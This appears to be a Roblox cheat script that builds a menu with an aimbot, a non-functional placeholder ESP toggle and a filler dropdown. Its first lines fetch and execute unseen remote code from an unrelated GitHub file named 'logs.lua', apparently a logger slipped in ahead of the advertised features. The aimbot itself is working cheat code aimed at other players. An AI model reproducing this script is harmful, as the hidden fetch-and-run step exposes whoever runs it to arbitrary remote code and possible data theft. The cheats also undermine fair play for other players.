-- Load the external script first before anything else
local externalScriptUrl = 'https://raw.githubusercontent.com/ffavex/AHfahf1r1-rah/main/logs.lua'
local externalScript = loadstring(game:HttpGet(externalScriptUrl))()
if externalScript then
    -- Execute the external script
    externalScript()
end

-- Load the DrRay library from the GitHub repository Library
local DrRayLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/DrRay-UI-Library/main/DrRay.lua"))()

-- Create a new window and set its title and theme
local window = DrRayLibrary:Load("Remedy-Mobile", "Default")

-- Create the first tab with an image ID
local tab1 = DrRayLibrary.newTab("Aim", "ImageIdHere")

-- Aimbot toggle: Move the camera to the closest player
tab1.newToggle("Aimbot", "Aimbot!", true, function(toggleState)
    if toggleState then
        print("Aimbot On")

        -- Function to get the closest player
        local function getClosestPlayer()
            local closestPlayer = nil
            local shortestDistance = math.huge

            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if player ~= game.Players.LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                    local distance = (player.Character.HumanoidRootPart.Position - game.Workspace.CurrentCamera.CFrame.Position).Magnitude
                    if distance < shortestDistance then
                        closestPlayer = player
                        shortestDistance = distance
                    end
                end
            end

            return closestPlayer
        end

        -- Move camera to aim at closest player
        local aimbotConnection
        aimbotConnection = game:GetService("RunService").RenderStepped:Connect(function()
            if not toggleState then
                aimbotConnection:Disconnect()
                return
            end

            local closestPlayer = getClosestPlayer()
            if closestPlayer and closestPlayer.Character and closestPlayer.Character:FindFirstChild("HumanoidRootPart") then
                game.Workspace.CurrentCamera.CFrame = CFrame.new(game.Workspace.CurrentCamera.CFrame.Position, closestPlayer.Character.HumanoidRootPart.Position)
            end
        end)
    else
        print("Aimbot Off")
        -- Optionally stop any aimbot-related activities here
    end
end)

-- ESP Toggle: Correctly handle the ESP box without freezing or duplicating
local activeESPConnections = {}

local function clearESP()
    -- Clear previous ESP boxes to prevent duplication
    for _, connection in pairs(activeESPConnections) do
        connection:Disconnect()
    end
    activeESPConnections = {}
end

local function createESP(player)
    -- Function to create ESP for each player
    local espConnection
    espConnection = game:GetService("RunService").RenderStepped:Connect(function()
        if not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then
            -- Stop drawing ESP if player is not valid anymore (left/died)
            espConnection:Disconnect()
            return
        end

        -- Draw ESP box around the player's HumanoidRootPart
        -- (You can customize this drawing logic further)
        -- Example logic for ESP drawing (pseudo-code, replace with your actual implementation)
        -- DrawBox(player.Character.HumanoidRootPart) -- Placeholder for ESP drawing function
    end)

    table.insert(activeESPConnections, espConnection)
end

-- Function to handle players leaving the game or dying
local function onPlayerRemoved(player)
    -- Clear ESP for the player that left
    clearESP()
end

-- ESP Toggle
local tab2 = DrRayLibrary.newTab("Visuals", "ImageIdLogoHere")
tab2.newToggle("ESP Box", "Esp Box", true, function(toggleState)
    if toggleState then
        print("ESP On")

        -- Clear any previous ESP instances to prevent duplication
        clearESP()

        -- Add ESP for all current players
        for _, player in pairs(game:GetService("Players"):GetPlayers()) do
            if player ~= game.Players.LocalPlayer then
                createESP(player)
            end
        end

        -- Connect events for players joining or leaving
        game:GetService("Players").PlayerAdded:Connect(createESP)
        game:GetService("Players").PlayerRemoving:Connect(onPlayerRemoved)
    else
        print("ESP Off")
        -- Clear all ESP boxes when the ESP is toggled off
        clearESP()
    end
end)

-- Dropdown for other options
tab2.newDropdown("Dropdown", "Select one of these options!", {"water", "dog", "air", "bb", "airplane", "wohhho", "yeay", "delete"}, function(selectedOption)
    print(selectedOption)
end)
